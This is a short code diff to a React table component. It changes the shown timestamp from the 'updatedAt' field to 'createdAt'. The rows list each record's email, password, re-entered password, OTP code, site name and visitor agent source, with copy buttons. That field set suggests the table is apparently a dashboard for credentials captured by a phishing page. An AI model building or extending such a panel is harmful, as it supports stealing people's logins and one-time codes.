@@ -76,7 +76,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt, agent: { source }, status, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user,  createdAt, agent: { source }, status, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -124,8 +124,8 @@ const InformationTable = () => {
                           }`}>Copy</button>
                     </div>
                   </td>
-                  <td onClick={() => handleCopyClick(formatUtcToLocal(updatedAt))} className="px-2 py-1 font-bold cursor-pointer">
-                    {formatUtcToLocal(updatedAt)}
+                  <td onClick={() => handleCopyClick(formatUtcToLocal(createdAt))} className="px-2 py-1 font-bold cursor-pointer">
+                    {formatUtcToLocal(createdAt)}
                   </td>
                 </tr>
 
